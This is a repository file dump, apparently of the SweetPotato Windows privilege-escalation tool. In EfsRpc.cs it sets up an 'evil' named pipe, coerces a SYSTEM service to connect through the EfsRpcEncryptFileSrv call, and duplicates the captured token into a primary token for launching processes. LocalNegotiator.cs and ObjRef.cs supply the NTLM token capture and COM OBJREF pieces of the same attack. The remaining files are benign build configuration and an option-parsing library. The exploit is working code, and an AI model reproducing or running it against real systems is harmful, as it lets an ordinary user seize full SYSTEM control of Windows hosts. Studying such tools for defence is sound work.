          "content": "﻿using NtApiDotNet.Ndr.Marshal;\r\nusing NtApiDotNet.Win32;\r\nusing rpc_df1941c5_fe89_4e79_bf10_463657acf44d_1_0;\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.IO.Pipes;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Threading;\r\nusing System.Threading.Tasks;\r\n\r\nnamespace SweetPotato {\r\n    internal class EfsRpc {\r\n\r\n        string pipeName = Guid.NewGuid().ToString();\r\n\r\n        NamedPipeServerStream efsrpcPipe;\r\n        Thread efsrpcPipeThread;\r\n        IntPtr systemImpersonationToken = IntPtr.Zero;\r\n\r\n        public IntPtr Token { get {return systemImpersonationToken; } }\r\n\r\n        void EfsRpcPipeThread() {\r\n\r\n            byte[] data = new byte[4];\r\n\r\n            efsrpcPipe = new NamedPipeServerStream($\"{pipeName}\\\\pipe\\\\srvsvc\", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);\r\n            efsrpcPipe.WaitForConnection();\r\n\r\n            Console.WriteLine(\"[+] Server connected to our evil RPC pipe\");\r\n\r\n            efsrpcPipe.Read(data, 0, 4);\r\n\r\n            efsrpcPipe.RunAsClient(() => {\r\n                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),\r\n                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle)) {\r\n                    Console.WriteLine(\"[-] Failed to open thread token\");\r\n                    return;\r\n                }\r\n\r\n                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,\r\n                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,\r\n                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken)) {\r\n                    Console.WriteLine(\"[-] Failed to duplicate impersonation token\");\r\n                    return;\r\n                }\r\n                \r\n                Console.WriteLine(\"[+] Duplicated impersonation token ready for process creation\");\r\n            });\r\n\r\n            efsrpcPipe.Close();\r\n        }\r\n\r\n        public EfsRpc() {\r\n            efsrpcPipeThread = new Thread(EfsRpcPipeThread);\r\n            efsrpcPipeThread.Start();\r\n        }\r\n\r\n        public void TriggerEfsRpc() {\r\n\r\n            string targetPipe = string.Format($\"\\\\\\\\localhost/pipe/{pipeName}/\\\\{pipeName}\\\\{pipeName}\");\r\n\r\n            Client c = new Client();\r\n\r\n            try\r\n            {\r\n                c.Connect();\r\n            }\r\n            catch (Exception)\r\n            {\r\n                Console.WriteLine($\"[-] Failed to connect to RPC endpoint using ALPC transport, trying named pipes instead...\");\r\n            }\r\n\r\n            if (c.Connected == false)\r\n            {\r\n                try\r\n                {\r\n                    NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity trsec = new NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity();\r\n                    trsec.AuthenticationLevel = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationLevel.PacketPrivacy;\r\n                    trsec.AuthenticationType = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationType.Negotiate;\r\n\r\n                    c.Connect(\"ncacn_np\", \"\\\\pipe\\\\efsrpc\", \"localhost\", trsec);\r\n                }\r\n                catch (Exception)\r\n                {\r\n                    Console.WriteLine($\"[-] Failed to connect to RPC endpoint using named pipes transport.\");\r\n                }\r\n            }\r\n\r\n            if (c.Connected)\r\n            {\r\n                Console.WriteLine($\"[+] Triggering name pipe access on evil PIPE {targetPipe}\");\r\n\r\n                c.EfsRpcEncryptFileSrv(targetPipe);\r\n                // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112\r\n            }\r\n        }\r\n    }\r\n}\r\n"
        },
        {
          "name": "FodyWeavers.xml",
          "type": "blob",
          "size": 0.228515625,
          "content": "﻿<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Weavers xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"FodyWeavers.xsd\">\n  <Costura IncludeDebugSymbols='false' DisableCompression='false'  />\n</Weavers>"
        },
        {
          "name": "FodyWeavers.xsd",
          "type": "blob",
          "size": 6.462890625,
          "content": "﻿<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n  <!-- This file was generated by Fody. Manual changes to this file will be lost when your project is rebuilt. -->\n  <xs:element name=\"Weavers\">\n    <xs:complexType>\n      <xs:all>\n        <xs:element name=\"Costura\" minOccurs=\"0\" maxOccurs=\"1\">\n          <xs:complexType>\n            <xs:all>\n              <xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"ExcludeAssemblies\" type=\"xs:string\">\n                <xs:annotation>\n                  <xs:documentation>A list of assembly names to exclude from the default action of \"embed all Copy Local references\", delimited with line breaks</xs:documentation>\n                </xs:annotation>\n              </xs:element>\n              <xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"IncludeAssemblies\" type=\"xs:string\">\n                <xs:annotation>\n                  <xs:documentation>A list of assembly names to include from the default action of \"embed all Copy Local references\", delimited with line breaks.</xs:documentation>\n                </xs:annotation>\n              </xs:element>\n              <xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"Unmanaged32Assemblies\" type=\"xs:string\">\n                <xs:annotation>\n                  <xs:documentation>A list of unmanaged 32 bit assembly names to include, delimited with line breaks.</xs:documentation>\n                </xs:annotation>\n              </xs:element>\n              <xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"Unmanaged64Assemblies\" type=\"xs:string\">\n                <xs:annotation>\n                  <xs:documentation>A list of unmanaged 64 bit assembly names to include, delimited with line breaks.</xs:documentation>\n                </xs:annotation>\n              </xs:element>\n              <xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"PreloadOrder\" type=\"xs:string\">\n                <xs:annotation>\n                  <xs:documentation>The order of preloaded assemblies, delimited with line breaks.</xs:documentation>\n                </xs:annotation>\n              </xs:element>\n            </xs:all>\n            <xs:attribute name=\"CreateTemporaryAssemblies\" type=\"xs:boolean\">\n              <xs:annotation>\n                <xs:documentation>This will copy embedded files to disk before loading them into memory. This is helpful for some scenarios that expected an assembly to be loaded from a physical file.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"IncludeDebugSymbols\" type=\"xs:boolean\">\n              <xs:annotation>\n                <xs:documentation>Controls if .pdbs for reference assemblies are also embedded.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"DisableCompression\" type=\"xs:boolean\">\n              <xs:annotation>\n                <xs:documentation>Embedded assemblies are compressed by default, and uncompressed when they are loaded. You can turn compression off with this option.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"DisableCleanup\" type=\"xs:boolean\">\n              <xs:annotation>\n                <xs:documentation>As part of Costura, embedded assemblies are no longer included as part of the build. This cleanup can be turned off.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"LoadAtModuleInit\" type=\"xs:boolean\">\n              <xs:annotation>\n                <xs:documentation>Costura by default will load as part of the module initialization. This flag disables that behavior. Make sure you call CosturaUtility.Initialize() somewhere in your code.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"IgnoreSatelliteAssemblies\" type=\"xs:boolean\">\n              <xs:annotation>\n                <xs:documentation>Costura will by default use assemblies with a name like 'resources.dll' as a satellite resource and prepend the output path. This flag disables that behavior.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"ExcludeAssemblies\" type=\"xs:string\">\n              <xs:annotation>\n                <xs:documentation>A list of assembly names to exclude from the default action of \"embed all Copy Local references\", delimited with |</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"IncludeAssemblies\" type=\"xs:string\">\n              <xs:annotation>\n                <xs:documentation>A list of assembly names to include from the default action of \"embed all Copy Local references\", delimited with |.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"Unmanaged32Assemblies\" type=\"xs:string\">\n              <xs:annotation>\n                <xs:documentation>A list of unmanaged 32 bit assembly names to include, delimited with |.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"Unmanaged64Assemblies\" type=\"xs:string\">\n              <xs:annotation>\n                <xs:documentation>A list of unmanaged 64 bit assembly names to include, delimited with |.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n            <xs:attribute name=\"PreloadOrder\" type=\"xs:string\">\n              <xs:annotation>\n                <xs:documentation>The order of preloaded assemblies, delimited with |.</xs:documentation>\n              </xs:annotation>\n            </xs:attribute>\n          </xs:complexType>\n        </xs:element>\n      </xs:all>\n      <xs:attribute name=\"VerifyAssembly\" type=\"xs:boolean\">\n        <xs:annotation>\n          <xs:documentation>'true' to run assembly verification (PEVerify) on the target assembly after all weavers have been executed.</xs:documentation>\n        </xs:annotation>\n      </xs:attribute>\n      <xs:attribute name=\"VerifyIgnoreCodes\" type=\"xs:string\">\n        <xs:annotation>\n          <xs:documentation>A comma-separated list of error codes that can be safely ignored in assembly verification.</xs:documentation>\n        </xs:annotation>\n      </xs:attribute>\n      <xs:attribute name=\"GenerateXsd\" type=\"xs:boolean\">\n        <xs:annotation>\n          <xs:documentation>'false' to turn off automatic generation of the XML Schema file.</xs:documentation>\n        </xs:annotation>\n      </xs:attribute>\n    </xs:complexType>\n  </xs:element>\n</xs:schema>"
        },
        {
          "name": "LocalNegotiator.cs",
          "type": "blob",
          "size": 3.1494140625,
          "content": "﻿using System;\nusing static SweetPotato.SSPIHelper;\n\nnamespace SweetPotato {\n\n    internal class LocalNegotiator {\n\n        const int ASC_REQ_ALLOCATE_MEMORY = 0x00000100;\n        const int ASC_REQ_CONNECTION = 0x00000800;\n\n        CtxHandle phContext = new CtxHandle();\n        CredHandle hCred = new CredHandle();\n        SecBufferDesc secServerBufferDesc;\n\n        public bool Authenticated { get; private set; } = false;\n        public IntPtr Token { get; private set; } = IntPtr.Zero;\n\n        public byte[] Challenge { get {\n                return secServerBufferDesc.GetSecBuffer().GetBytes();\n            }\n        } \n\n        public bool HandleType1(byte[] ntmlBytes) {\n\n            TimeStamp ts = new TimeStamp();\n\n            int status = AcquireCredentialsHandle(null, \"Negotiate\", SECPKG_CRED_INBOUND, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hCred, ts);\n\n            if (status != SEC_E_OK) {\n                Console.WriteLine(\"[!] Error {0} result from AcquireCredentialsHandle\", status);\n                return false;\n            }\n\n            SecBufferDesc secClientBufferDesc = new SecBufferDesc(ntmlBytes);\n            secServerBufferDesc = new SecBufferDesc(8192); \n\n            UInt32 fContextAttr;\n\n            status = AcceptSecurityContext(hCred, null, ref secClientBufferDesc, ASC_REQ_CONNECTION,\n                SECURITY_NATIVE_DREP, phContext, out secServerBufferDesc, out fContextAttr, ts);\n\n            if(status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {\n                Console.WriteLine(\"[!] Error {0} result from AcceptSecurityContext\", status);\n                return false;\n            }\n\n            return true;\n        }\n\n        public int HandleType2(byte[] ntlmBytes) {\n\n            SecBuffer secBuffer = secServerBufferDesc.GetSecBuffer();\n            byte[] newNtlmBytes = secBuffer.GetBytes();\n\n            if (ntlmBytes.Length >= newNtlmBytes.Length) {\n                for (int idx = 0; idx < ntlmBytes.Length; ++idx) {\n                    if (idx < newNtlmBytes.Length) {\n                        ntlmBytes[idx] = newNtlmBytes[idx];\n                    } else {\n                        ntlmBytes[idx] = 0;\n                    }\n                }\n            } else {\n                Console.WriteLine(\"NTLM Type2 cannot be replaced.  New buffer too big\");\n            }\n\n            return 0;\n        }\n\n        public int HandleType3(byte[] ntmlBytes) {\n\n            SecBufferDesc secClientBufferDesc = new SecBufferDesc(ntmlBytes);\n            secServerBufferDesc = new SecBufferDesc(0);\n            CtxHandle phContextNew = new CtxHandle();\n\n            UInt32 fContextAttr;\n            TimeStamp ts = new TimeStamp();\n\n            int status = AcceptSecurityContext(hCred, phContext, ref secClientBufferDesc, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,\n                SECURITY_NATIVE_DREP, phContext, out secServerBufferDesc, out fContextAttr, ts);\n\n            if (status == 0) {\n                Authenticated = true;\n                IntPtr hToken;\n                if ((status = QuerySecurityContextToken(phContext, out hToken)) == 0) {\n                    Token = hToken;\n                }\n            }\n\n            return status;\n        }\n    }\n}\n"
        },
        {
          "name": "ObjRef.cs",
          "type": "blob",
          "size": 7.6005859375,
          "content": "﻿using System;\nusing System.IO;\nusing System.Text;\n\nnamespace SweetPotato {\n\n    public enum TowerProtocol : ushort {\n        EPM_PROTOCOL_DNET_NSP = 0x04,\n        EPM_PROTOCOL_OSI_TP4 = 0x05,\n        EPM_PROTOCOL_OSI_CLNS = 0x06,\n        EPM_PROTOCOL_TCP = 0x07,\n        EPM_PROTOCOL_UDP = 0x08,\n        EPM_PROTOCOL_IP = 0x09,\n        EPM_PROTOCOL_NCADG = 0x0a, /* Connectionless RPC */\n        EPM_PROTOCOL_NCACN = 0x0b,\n        EPM_PROTOCOL_NCALRPC = 0x0c, /* Local RPC */\n        EPM_PROTOCOL_UUID = 0x0d,\n        EPM_PROTOCOL_IPX = 0x0e,\n        EPM_PROTOCOL_SMB = 0x0f,\n        EPM_PROTOCOL_NAMED_PIPE = 0x10,\n        EPM_PROTOCOL_NETBIOS = 0x11,\n        EPM_PROTOCOL_NETBEUI = 0x12,\n        EPM_PROTOCOL_SPX = 0x13,\n        EPM_PROTOCOL_NB_IPX = 0x14, /* NetBIOS over IPX */\n        EPM_PROTOCOL_DSP = 0x16, /* AppleTalk Data Stream Protocol */\n        EPM_PROTOCOL_DDP = 0x17, /* AppleTalk Data Datagram Protocol */\n        EPM_PROTOCOL_APPLETALK = 0x18, /* AppleTalk */\n        EPM_PROTOCOL_VINES_SPP = 0x1a,\n        EPM_PROTOCOL_VINES_IPC = 0x1b, /* Inter Process Communication */\n        EPM_PROTOCOL_STREETTALK = 0x1c, /* Vines Streettalk */\n        EPM_PROTOCOL_HTTP = 0x1f,\n        EPM_PROTOCOL_UNIX_DS = 0x20, /* Unix domain socket */\n        EPM_PROTOCOL_NULL = 0x21\n    }\n\n    internal class ObjRef {\n\n        [Flags]\n        enum Type : uint {\n            Standard = 0x1,\n            Handler = 0x2,\n            Custom = 0x4\n        }\n\n        const uint Signature = 0x574f454d;\n        public readonly Guid Guid;\n        public readonly Standard StandardObjRef;\n\n        public ObjRef(Guid guid, Standard standardObjRef) {\n            Guid = guid;\n            StandardObjRef = standardObjRef;\n        }\n\n        public ObjRef(byte[] objRefBytes) {\n\n            BinaryReader br = new BinaryReader(new MemoryStream(objRefBytes), Encoding.Unicode);\n\n            if (br.ReadUInt32() != Signature) {\n                throw new InvalidDataException(\"Does not look like an OBJREF stream\");\n            }\n\n            uint flags = br.ReadUInt32();\n            Guid = new Guid(br.ReadBytes(16));\n\n            if ((Type)flags == Type.Standard) {\n                StandardObjRef = new Standard(br);\n            }\n        }\n\n        public byte[] GetBytes() {\n            BinaryWriter bw = new BinaryWriter(new MemoryStream());\n\n            bw.Write(Signature);\n            bw.Write((uint)1);\n            bw.Write(Guid.ToByteArray());\n\n            StandardObjRef.Save(bw);\n\n            return ((MemoryStream)bw.BaseStream).ToArray();\n        }\n\n        internal class SecurityBinding {\n\n            public readonly ushort AuthnSvc;\n            public readonly ushort AuthzSvc;\n            public readonly string PrincipalName;\n\n            public SecurityBinding(ushort authnSvc, ushort authzSnc, string principalName) {\n                AuthnSvc = authnSvc;\n                AuthzSvc = authzSnc;\n                PrincipalName = principalName;\n            }\n\n            public SecurityBinding(BinaryReader br) {\n\n                AuthnSvc = br.ReadUInt16();\n                AuthzSvc = br.ReadUInt16();\n                char character;\n                string principalName = \"\";\n\n                while ((character = br.ReadChar()) != 0) {\n                    principalName += character;\n                }\n\n                br.ReadChar();\n            }\n\n\n            public byte[] GetBytes() {\n                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);\n\n                bw.Write(AuthnSvc);\n                bw.Write(AuthzSvc);\n\n                if (PrincipalName != null && PrincipalName.Length > 0)\n                    bw.Write(Encoding.Unicode.GetBytes(PrincipalName));\n\n                bw.Write((char)0);\n                bw.Write((char)0);\n\n                return ((MemoryStream)bw.BaseStream).ToArray();\n            }\n        }\n\n        internal class StringBinding {\n            public readonly TowerProtocol TowerID;\n            public readonly string NetworkAddress;\n\n            public StringBinding(TowerProtocol towerID, string networkAddress) {\n                TowerID = towerID;\n                NetworkAddress = networkAddress;\n            }\n\n            public StringBinding(BinaryReader br) {\n                TowerID = (TowerProtocol)br.ReadUInt16();\n                char character;\n                string networkAddress = \"\";\n\n                while ((character = br.ReadChar()) != 0) {\n                    networkAddress += character;\n                }\n\n                br.ReadChar();\n                NetworkAddress = networkAddress;\n            }\n\n            internal byte[] GetBytes() {\n                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);\n\n                bw.Write((ushort)TowerID);\n                bw.Write(Encoding.Unicode.GetBytes(NetworkAddress));\n                bw.Write((char)0);\n                bw.Write((char)0);\n\n                return ((MemoryStream)bw.BaseStream).ToArray();\n            }\n        }\n\n        internal class DualStringArray {\n            private readonly ushort NumEntries;\n            private readonly ushort SecurityOffset;\n            public readonly StringBinding StringBinding;\n            public readonly SecurityBinding SecurityBinding;\n\n            public DualStringArray(StringBinding stringBinding, SecurityBinding securityBinding) {\n                NumEntries = (ushort)((stringBinding.GetBytes().Length + securityBinding.GetBytes().Length) / 2);\n                SecurityOffset = (ushort)(stringBinding.GetBytes().Length / 2);\n\n                StringBinding = stringBinding;\n                SecurityBinding = securityBinding;\n            }\n\n            public DualStringArray(BinaryReader br) {\n                NumEntries = br.ReadUInt16();\n                SecurityOffset = br.ReadUInt16();\n\n                StringBinding = new StringBinding(br);\n                SecurityBinding = new SecurityBinding(br);\n            }\n\n            internal void Save(BinaryWriter bw) {\n\n                byte[] stringBinding = StringBinding.GetBytes();\n                byte[] securityBinding = SecurityBinding.GetBytes();\n\n                bw.Write((ushort)((stringBinding.Length + securityBinding.Length) / 2));\n                bw.Write((ushort)(stringBinding.Length / 2));\n                bw.Write(stringBinding);\n                bw.Write(securityBinding);\n            }\n        }\n\n        internal class Standard {\n\n            const ulong Oxid = 0x0703d84a06ec96cc;\n            const ulong Oid = 0x539d029cce31ac;\n\n            public readonly uint Flags;\n            public readonly uint PublicRefs;\n            public readonly ulong OXID;\n            public readonly ulong OID;\n            public readonly Guid IPID;\n            public readonly DualStringArray DualStringArray;\n\n            public Standard(uint flags, uint publicRefs, ulong oxid, ulong oid, Guid ipid, DualStringArray dualStringArray) {\n                Flags = flags;\n                PublicRefs = publicRefs;\n                OXID = oxid;\n                OID = oid;\n                IPID = ipid;\n                DualStringArray = dualStringArray;\n            }\n\n            public Standard(BinaryReader br) {\n                Flags = br.ReadUInt32();\n                PublicRefs = br.ReadUInt32();\n                OXID = br.ReadUInt64();\n                OID = br.ReadUInt64();\n                IPID = new Guid(br.ReadBytes(16));\n\n                DualStringArray = new DualStringArray(br);\n            }\n\n            internal void Save(BinaryWriter bw) {\n                bw.Write(Flags);\n                bw.Write(PublicRefs);\n                bw.Write(OXID);\n                bw.Write(OID);\n                bw.Write(IPID.ToByteArray());\n                DualStringArray.Save(bw);\n            }\n        }\n    }\n}\n"
        },
        {
          "name": "Options.cs",
          "type": "blob",
          "size": 67.8193359375,
          "content": "﻿//\n// Options.cs\n//\n// Authors:\n//  Jonathan Pryor <jpryor@novell.com>, <Jonathan.Pryor@microsoft.com>\n//  Federico Di Gregorio <fog@initd.org>\n//  Rolf Bjarne Kvinge <rolf@xamarin.com>\n//\n// Copyright (C) 2008 Novell (http://www.novell.com)\n// Copyright (C) 2009 Federico Di Gregorio.\n// Copyright (C) 2012 Xamarin Inc (http://www.xamarin.com)\n// Copyright (C) 2017 Microsoft Corporation (http://www.microsoft.com)\n//\n// Permission is hereby granted, free of charge, to any person obtaining\n// a copy of this software and associated documentation files (the\n// \"Software\"), to deal in the Software without restriction, including\n// without limitation the rights to use, copy, modify, merge, publish,\n// distribute, sublicense, and/or sell copies of the Software, and to\n// permit persons to whom the Software is furnished to do so, subject to\n// the following conditions:\n// \n// The above copyright notice and this permission notice shall be\n// included in all copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\n// LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n// OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n// WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n//\n\n// Compile With:\n//   mcs -debug+ -r:System.Core Options.cs -o:Mono.Options.dll -t:library\n//   mcs -debug+ -d:LINQ -r:System.Core Options.cs -o:Mono.Options.dll -t:library\n//\n// The LINQ version just changes the implementation of\n// OptionSet.Parse(IEnumerable<string>), and confers no semantic changes.\n\n//\n// A Getopt::Long-inspired option parsing library for C#.\n//\n// Mono.Options.OptionSet is built upon a key/value table, where the\n// key is a option format string and the value is a delegate that is \n// invoked when the format string is matched.\n//\n// Option format strings:\n//  Regex-like BNF Grammar: \n//    name: .+\n//    type: [=:]\n//    sep: ( [^{}]+ | '{' .+ '}' )?\n//    aliases: ( name type sep ) ( '|' name type sep )*\n// \n// Each '|'-delimited name is an alias for the associated action.  If the\n// format string ends in a '=', it has a required value.  If the format\n// string ends in a ':', it has an optional value.  If neither '=' or ':'\n// is present, no value is supported.  `=' or `:' need only be defined on one\n// alias, but if they are provided on more than one they must be consistent.\n//\n// Each alias portion may also end with a \"key/value separator\", which is used\n// to split option values if the option accepts > 1 value.  If not specified,\n// it defaults to '=' and ':'.  If specified, it can be any character except\n// '{' and '}' OR the *string* between '{' and '}'.  If no separator should be\n// used (i.e. the separate values should be distinct arguments), then \"{}\"\n// should be used as the separator.\n//\n// Options are extracted either from the current option by looking for\n// the option name followed by an '=' or ':', or is taken from the\n// following option IFF:\n//  - The current option does not contain a '=' or a ':'\n//  - The current option requires a value (i.e. not a Option type of ':')\n//\n// The `name' used in the option format string does NOT include any leading\n// option indicator, such as '-', '--', or '/'.  All three of these are\n// permitted/required on any named option.\n//\n// Option bundling is permitted so long as:\n//   - '-' is used to start the option group\n//   - all of the bundled options are a single character\n//   - at most one of the bundled options accepts a value, and the value\n//     provided starts from the next character to the end of the string.\n//\n// This allows specifying '-a -b -c' as '-abc', and specifying '-D name=value'\n// as '-Dname=value'.\n//\n// Option processing is disabled by specifying \"--\".  All options after \"--\"\n// are returned by OptionSet.Parse() unchanged and unprocessed.\n//\n// Unprocessed options are returned from OptionSet.Parse().\n//\n// Examples:\n//  int verbose = 0;\n//  OptionSet p = new OptionSet ()\n//    .Add (\"v\", v => ++verbose)\n//    .Add (\"name=|value=\", v => Console.WriteLine (v));\n//  p.Parse (new string[]{\"-v\", \"--v\", \"/v\", \"-name=A\", \"/name\", \"B\", \"extra\"});\n//\n// The above would parse the argument string array, and would invoke the\n// lambda expression three times, setting `verbose' to 3 when complete.  \n// It would also print out \"A\" and \"B\" to standard output.\n// The returned array would contain the string \"extra\".\n//\n// C# 3.0 collection initializers are supported and encouraged:\n//  var p = new OptionSet () {\n//    { \"h|?|help\", v => ShowHelp () },\n//  };\n//\n// System.ComponentModel.TypeConverter is also supported, allowing the use of\n// custom data types in the callback type; TypeConverter.ConvertFromString()\n// is used to convert the value option to an instance of the specified\n// type:\n//\n//  var p = new OptionSet () {\n//    { \"foo=\", (Foo f) => Console.WriteLine (f.ToString ()) },\n//  };\n//\n// Random other tidbits:\n//  - Boolean options (those w/o '=' or ':' in the option format string)\n//    are explicitly enabled if they are followed with '+', and explicitly\n//    disabled if they are followed with '-':\n//      string a = null;\n//      var p = new OptionSet () {\n//        { \"a\", s => a = s },\n//      };\n//      p.Parse (new string[]{\"-a\"});   // sets v != null\n//      p.Parse (new string[]{\"-a+\"});  // sets v != null\n//      p.Parse (new string[]{\"-a-\"});  // sets v == null\n//\n\n//\n// Mono.Options.CommandSet allows easily having separate commands and\n// associated command options, allowing creation of a *suite* along the\n// lines of **git**(1), **svn**(1), etc.\n//\n// CommandSet allows intermixing plain text strings for `--help` output,\n// Option values -- as supported by OptionSet -- and Command instances,\n// which have a name, optional help text, and an optional OptionSet.\n//\n//  var suite = new CommandSet (\"suite-name\") {\n//    // Use strings and option values, as with OptionSet\n//    \"usage: suite-name COMMAND [OPTIONS]+\",\n//    { \"v:\", \"verbosity\", (int? v) => Verbosity = v.HasValue ? v.Value : Verbosity+1 },\n//    // Commands may also be specified\n//    new Command (\"command-name\", \"command help\") {\n//      Options = new OptionSet {/*...*/},\n//      Run     = args => { /*...*/},\n//    },\n//    new MyCommandSubclass (),\n//  };\n//  return suite.Run (new string[]{...});\n//\n// CommandSet provides a `help` command, and forwards `help COMMAND`\n// to the registered Command instance by invoking Command.Invoke()\n// with `--help` as an option.\n//\n\nusing System;\nusing System.Collections;\nusing System.Collections.Generic;\nusing System.Collections.ObjectModel;\nusing System.ComponentModel;\nusing System.Globalization;\nusing System.IO;\n#if PCL\nusing System.Reflection;\n#else\nusing System.Runtime.Serialization;\nusing System.Security.Permissions;\n#endif\nusing System.Text;\nusing System.Text.RegularExpressions;\n\n#if LINQ\nusing System.Linq;\n#endif\n\n#if TEST\nusing NDesk.Options;\n#endif\n\n#if PCL\nusing MessageLocalizerConverter = System.Func<string, string>;\n#else\nusing MessageLocalizerConverter = System.Converter<string, string>;\n#endif\n\n#if NDESK_OPTIONS\nnamespace NDesk.Options\n#else\nnamespace Mono.Options\n#endif\n{\n    static class StringCoda {\n\n        public static IEnumerable<string> WrappedLines(string self, params int[] widths) {\n            IEnumerable<int> w = widths;\n            return WrappedLines(self, w);\n        }\n\n        public static IEnumerable<string> WrappedLines(string self, IEnumerable<int> widths) {\n            if (widths == null)\n                throw new ArgumentNullException(\"widths\");\n            return CreateWrappedLinesIterator(self, widths);\n        }\n\n        private static IEnumerable<string> CreateWrappedLinesIterator(string self, IEnumerable<int> widths) {\n            if (string.IsNullOrEmpty(self)) {\n                yield return string.Empty;\n                yield break;\n            }\n            using (IEnumerator<int> ewidths = widths.GetEnumerator()) {\n                bool? hw = null;\n                int width = GetNextWidth(ewidths, int.MaxValue, ref hw);\n                int start = 0, end;\n                do {\n                    end = GetLineEnd(start, width, self);\n                    // endCorrection is 1 if the line end is '\\n', and might be 2 if the line end is '\\r\\n'.\n                    int endCorrection = 1;\n                    if (end >= 2 && self.Substring(end - 2, 2).Equals(\"\\r\\n\"))\n                        endCorrection = 2;\n                    char c = self[end - endCorrection];\n                    if (char.IsWhiteSpace(c))\n                        end -= endCorrection;\n                    bool needContinuation = end != self.Length && !IsEolChar(c);\n                    string continuation = \"\";\n                    if (needContinuation) {\n                        --end;\n                        continuation = \"-\";\n                    }\n                    string line = self.Substring(start, end - start) + continuation;\n                    yield return line;\n                    start = end;\n                    if (char.IsWhiteSpace(c))\n                        start += endCorrection;\n                    width = GetNextWidth(ewidths, width, ref hw);\n                } while (start < self.Length);\n            }\n        }\n\n        private static int GetNextWidth(IEnumerator<int> ewidths, int curWidth, ref bool? eValid) {\n            if (!eValid.HasValue || (eValid.HasValue && eValid.Value)) {\n                curWidth = (eValid = ewidths.MoveNext()).Value ? ewidths.Current : curWidth;\n                // '.' is any character, - is for a continuation\n                const string minWidth = \".-\";\n                if (curWidth < minWidth.Length)\n                    throw new ArgumentOutOfRangeException(\"widths\",\n                            string.Format(\"Element must be >= {0}, was {1}.\", minWidth.Length, curWidth));\n                return curWidth;\n            }\n            // no more elements, use the last element.\n            return curWidth;\n        }\n\n        private static bool IsEolChar(char c) {\n            return !char.IsLetterOrDigit(c);\n        }\n\n        private static int GetLineEnd(int start, int length, string description) {\n            int end = System.Math.Min(start + length, description.Length);\n            int sep = -1;\n            for (int i = start; i < end; ++i) {\n                if (i + 2 <= description.Length && description.Substring(i, 2).Equals(\"\\r\\n\"))\n                    return i + 2;\n                if (description[i] == '\\n')\n                    return i + 1;\n                if (IsEolChar(description[i]))\n                    sep = i + 1;\n            }\n            if (sep == -1 || end == description.Length)\n                return end;\n            return sep;\n        }\n    }\n\n    public class OptionValueCollection : IList, IList<string> {\n\n        List<string> values = new List<string>();\n        OptionContext c;\n\n        internal OptionValueCollection(OptionContext c) {\n            this.c = c;\n        }\n\n        #region ICollection\n        void ICollection.CopyTo(Array array, int index) { (values as ICollection).CopyTo(array, index); }\n        bool ICollection.IsSynchronized { get { return (values as ICollection).IsSynchronized; } }\n        object ICollection.SyncRoot { get { return (values as ICollection).SyncRoot; } }\n        #endregion\n\n        #region ICollection<T>\n        public void Add(string item) { values.Add(item); }\n        public void Clear() { values.Clear(); }\n        public bool Contains(string item) { return values.Contains(item); }\n        public void CopyTo(string[] array, int arrayIndex) { values.CopyTo(array, arrayIndex); }\n        public bool Remove(string item) { return values.Remove(item); }\n        public int Count { get { return values.Count; } }\n        public bool IsReadOnly { get { return false; } }\n        #endregion\n\n        #region IEnumerable\n        IEnumerator IEnumerable.GetEnumerator() { return values.GetEnumerator(); }\n        #endregion\n\n        #region IEnumerable<T>\n        public IEnumerator<string> GetEnumerator() { return values.GetEnumerator(); }\n        #endregion\n\n        #region IList\n        int IList.Add(object value) { return (values as 